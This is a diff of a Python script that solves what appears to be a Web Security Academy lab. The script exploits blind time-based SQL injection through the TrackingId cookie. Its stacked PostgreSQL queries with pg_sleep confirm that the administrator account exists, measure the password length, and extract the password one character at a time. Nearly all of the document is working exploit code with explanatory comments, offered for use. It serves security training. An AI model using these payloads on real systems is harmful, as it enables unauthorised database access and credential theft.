@@ -1,57 +1,83 @@
 #!/usr/bin/env python3
 
 import requests
-from threading import Thread, Lock
-from string import digits, ascii_lowercase
-import time
-
-# Initialize necessary variables
-url = 'https://0a8200d0047ab80a80728a9f004f004b.web-security-academy.net/login'
-pool = digits + ascii_lowercase
-pwd = []
+import urllib
+from string import digits, ascii_letters
 
 
-# Function to make the request and measure the time taken
-def make_req(i, letter):
-    global pwd
-    payload = {"TrackingId": f"Qdsgj7juZVDHmmYv';SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{letter}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"}
+url = 'https://0a3200bd039931fe80ab12ed005e0034.web-security-academy.net/login'
 
-    r = requests.get(url, cookies=payload)
-    duration = r.elapsed.total_seconds()
+session = requests.Session()
 
-    if duration > 10:
-        print(letter)
-        return True
+TRACKING_COOKIE = 'c52fX0J6cIAZpMPn'
+cookies = {
+    "TrackingId": f"{TRACKING_COOKIE}'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END----"
+}
 
-    return False
-        # with pwd_lock:
-        #     if len(pwd) < i:
-        #         pwd.append(letter)
-        #         print(f"Position {i} found letter: {letter}")
+# response = session.get(url, cookies=cookies)
+# print(response.status_code)
+# print(f'time taken (in seconds): {response.elapsed.total_seconds()}')
 
+# Now we know that the time delay is based on whether the condition is true or not
+# if our conditions are true, we trigger a delay, else we don't
 
-# Function to solve for each position in the password
-def solve():
-    for i in range(1, 21):
-        # threads = []
-        for letter in pool:
-            x = make_req(i, letter)
-
-            if x is True:
-                break
-        break
-        #     t = Thread(target=make_req, args=(i, letter))
-        #     threads.append(t)
-        #     t.start()
-        #
-        # for t in threads:
-        #     t.join()
-        #
-        # if len(pwd) < i:
-        #     print(f"Failed to find letter for position {i}")
-        #     break
+# we can do a LOOOOT of fun things using this vulnerability
+# let's test if the user 'administrator' exists
 
 
-solve()
-print(f"Password found: {''.join(pwd)}")
+cookies = {
+    "TrackingId": f"{TRACKING_COOKIE}'; SELECT CASE WHEN (COUNT(username) > 0) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+}
+
+# URL encode the cookies
+encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}
+
+# response = session.get(url, cookies=encoded_cookies)
+# print(response.status_code)
+# print(f'time taken (in seconds): {response.elapsed.total_seconds()}')
+
+
+# we just figured out that there is at least one row with the username equal to admin
+# now, let's find out the length of the password
+# since the lab is asking us to leak the password and login
+
+
+cookies = {
+    "TrackingId": f"{TRACKING_COOKIE}'; SELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+}
+# URL encode the cookies
+encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}
+
+
+# response = session.get(url, cookies=encoded_cookies)
+# print(f'time taken (in seconds): {response.elapsed.total_seconds()}')
+
+
+# the length is indeed 20 chars, now we have to leak the password
+# for that we'll create a for loop to iterate over each sub string of the pwd
+# and test each position to a possible set of characters
+
+pool = digits + ascii_letters
+
+# this pwd variable is to store the found password
+pwd = ''
+
+
+# this will go from 0 to 19
+for i in range(20):
+    for letter in pool:
+        cookies = {
+            "TrackingId": f"{TRACKING_COOKIE}'; SELECT CASE WHEN (SUBSTRING(password, {i+1}, 1) = '{letter}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
+        }
+        encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}
+
+        response = session.get(url, cookies=encoded_cookies)
+        duration = response.elapsed.total_seconds()
+
+        if duration > 5:
+            pwd += letter
+            break
+
+print(f'PASSWORD: {pwd}')
+
 
